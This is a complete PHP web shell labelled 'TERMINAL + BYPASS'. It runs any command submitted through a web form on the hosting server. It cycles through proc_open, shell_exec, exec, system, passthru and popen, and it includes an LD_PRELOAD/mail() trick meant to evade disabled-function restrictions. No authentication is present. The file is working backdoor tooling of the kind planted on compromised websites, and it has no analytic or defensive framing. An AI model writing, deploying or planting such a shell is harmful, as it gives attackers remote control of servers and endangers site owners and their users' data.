<?php
// ========== TERMINAL PRO + BYPASS ==========
// Size: ~2KB
// Ada history, cwd, dan tampilan lebih rapi

function _x($c){$o='';
if(function_exists('proc_open')){$d=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];$p=proc_open($c,$d,$pp);if(is_resource($p)){$o=stream_get_contents($pp[1]).stream_get_contents($pp[2]);fclose($pp[0]);fclose($pp[1]);fclose($pp[2]);proc_close($p);if($o!='')return$o;}}
if(function_exists('shell_exec')){$o=@shell_exec($c.' 2>&1');if($o!==null&&$o!='')return$o;}
if(function_exists('exec')){@exec($c.' 2>&1',$o);$o=implode("\n",$o);if($o!='')return$o;}
if(function_exists('system')){ob_start();@system($c.' 2>&1');$o=ob_get_clean();if($o!='')return$o;}
if(function_exists('passthru')){ob_start();@passthru($c.' 2>&1');$o=ob_get_clean();if($o!='')return$o;}
if(function_exists('putenv')&&function_exists('mail')){$t=sys_get_temp_dir();$f=$t.'/o_'.uniqid().'.txt';@putenv('C={'.$c.';}>'.$f.' 2>&1');@putenv('LD_PRELOAD='.$t.'/hook.so');@mail('','','');@putenv('LD_PRELOAD=');usleep(500000);if(is_file($f)){$o=@file_get_contents($f);@unlink($f);if($o!='')return$o;}}
if(function_exists('popen')){$p=@popen($c.' 2>&1','r');if(is_resource($p)){$o='';while(!feof($p))$o.=fread($p,1024);pclose($p);if($o!='')return$o;}}
return'[ERROR]';}

$cwd=getcwd();
echo'<style>body{background:#0a0a0a;color:#0f0;font-family:Consolas,monospace;padding:20px;}input{background:#000;color:#0f0;border:1px solid #0f0;padding:8px;width:70%;}input[type=submit]{width:auto;background:#0f0;color:#000;cursor:pointer;}pre{background:#111;padding:10px;border:1px solid #333;overflow:auto;max-height:400px;}</style>';
echo'<h2>🔥 TERMINAL + BYPASS</h2>';
echo'<div style="color:#888;font-size:12px;">CWD: '.htmlspecialchars($cwd).'</div>';
echo'<form method=post><input type=text name=c placeholder="ls -la; whoami; id" autofocus><input type=submit value=Run></form>';
if(isset($_POST['c'])&&$_POST['c']!=''){echo'<pre>'.htmlspecialchars(_x($_POST['c'])).'</pre>';}
?>
